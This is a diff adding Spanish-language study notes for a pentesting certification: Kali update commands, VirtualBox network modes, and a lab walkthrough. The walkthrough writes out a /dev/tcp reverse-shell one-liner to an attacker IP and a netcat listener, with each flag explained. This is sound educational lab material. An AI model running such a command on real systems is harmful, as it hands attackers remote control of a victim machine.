@@ -9,3 +9,50 @@ En este Repositorio, apuntare todo lo que vaya aprendiendo de esta certificació
 
 Principalmente Mario nos pasa una máquina W7 para instalar en VirtualBox y nos explica como bajar una máquina Kali Linux para VirtualBox y cambiarle el idioma al teclado.
 
+---------------------------------------------------------------------------------------------
+
+Comandos para actualizar Kali Linux.
+
+`apt update` 
+
+`apt upgrade -y` 
+
+`apt autoremove` <!-- Sirve para poder eliminar las dependencias huerfanas -->
+
+`apt dist-upgrade` <!-- Se utiliza para actualizar todos los paquetes instalados a sus versiones más recientes -->
+
+`reboot`
+
+---------------------------------------------------------------------------------------------
+
+Explicación sobre adaptador puente, NAT y Red NAT
+
+Adaptador puente > las máquinas virtuales van a tener un comportamiento como si fuera un equipo más de mi red .
+
+NAT > Network Address Translation. Es una técnica que permite que varias máquinas virtuales utilicen una sola dirección IP pública para acceder a Internet, compartiendo la conexión de red de la máquina anfitriona. Con NAT, las VMs pueden navegar por Internet, pero no son accesibles directamente desde la red externa, lo que proporciona aislamiento y seguridad adicional en entornos de laboratorio. 
+
+Red NAT o Red Interna > Es una red que solo se ve en VirtualBox
+
+---------------------------------------------------------------------------------------------
+
+Máquina atacante entramos en esta web: https://www.revshells.com/ rellenamos la ip de nuestra máquina atacante (10.0.10.51) y ponemos el puerto, en este caso usamos el 443 y la web nos devuelve un comando para ejecutar en la máquina víctima, el comando ha sido este: 
+
+[`sh -i >& /dev/tcp/10.0.10.51/443 0>&1`](https://www.revshells.com/) es un comando que se utiliza para obtener una reverse shell desde la máquina víctima hacia la máquina atacante.
+
+- `sh -i`: Inicia una shell interactiva.
+- `>& /dev/tcp/10.0.10.51/443`: Redirige la entrada y salida estándar de la shell a una conexión TCP hacia la IP 10.0.10.51 en el puerto 443 (la máquina atacante).
+- `0>&1`: Redirige la entrada estándar para que también vaya por la conexión TCP.
+
+Esto permite que la máquina atacante controle la shell de la víctima a través de la red, siempre que en la máquina atacante esté escuchando Netcat en ese puerto.
+
+antes de ejecutar el comando en la máquina víctima hay que lanzar en la máquina atacante por la terminal el comando:
+
+`nc -nlvp 443` es un comando de Netcat (nc), una herramienta utilizada para leer y escribir datos a través de conexiones de red.  
+- `-n`: No resuelve nombres de host (usa direcciones IP directas).
+- `-l`: Escucha en modo servidor, esperando conexiones entrantes.
+- `-v`: Modo verbose, muestra información detallada.
+- `-p 443`: Especifica el puerto local (en este caso, el 443) donde escuchará.
+
+Este comando abre un puerto 443 en la máquina atacante y espera conexiones entrantes, útil para recibir una reverse shell desde la máquina víctima.
+
+Ejecutamos el comando en la máquina víctima (10.0.10.39) y esta establecerá una conexión hacia la máquina atacante. Desde la máquina atacante, al recibir la reverse shell, tendremos acceso remoto a la terminal de la víctima, lo que nos permitirá ejecutar comandos, lanzar scripts y realizar acciones de post-explotación.
